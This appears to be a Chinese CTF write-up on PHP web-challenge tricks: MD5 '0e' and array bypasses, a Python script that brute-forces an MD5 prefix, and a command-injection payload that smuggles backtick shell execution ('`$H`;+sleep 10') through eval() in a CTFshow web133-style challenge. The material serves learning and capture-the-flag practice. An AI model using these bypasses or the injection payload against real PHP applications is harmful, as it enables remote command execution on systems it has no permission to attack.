1.0e绕过
2.数组绕过
3.MD5碰撞

MD5前缀构造

step2:
构造出MD5值以”dcd385”开头的两个密钥
遍历数字构造得了
python脚本：

#-*- coding:utf-8 -*-
#脚本功能：生成以指定字符为开头的md5值（6位数字）
import hashlib
import random

def encryption(chars):
    m = hashlib.md5()
    m.update(str(chars).encode('utf-8'))
    return m.hexdigest()
    #return hashlib.md5(chars).hexdigest()
def main():
    start = "dcd385"
    for a in range(0,100000000):
        b = encryption(a)
        #print(a)
        if start == b[0:6]:
            print(a," ",b[0:6])
if __name__ == '__main__':
    main()
    print ('完成！')

数组绕过

md5不能加密数组,传入数组会报错,但会继续执行并且返回结果为null

数组绕过应用：

md5(Array()) = null
sha1(Array()) = null    
ereg(pattern,Array()) = null
preg_match(pattern,Array()) = false
strcmp(Array(), "abc") = null
strpos(Array(),"abc") = null
strlen(Array()) = null

分析一下代码发现仿佛是只能读取前面6个字符去执行命令，禁止了命令执行的函数
参考CTFshow web133
如果我们传递的参数就是$H本身，会发生变量覆盖
试下

sleep

/?HeNu=`$H`;+sleep 10

成功
因为是我们传递的$H;+sleep 10。先进行substr()函数截断然后去执行eval()函数
eval()函数的作用是执行php代码，``是shell_exec()函数的缩写，然后就去命令执行。
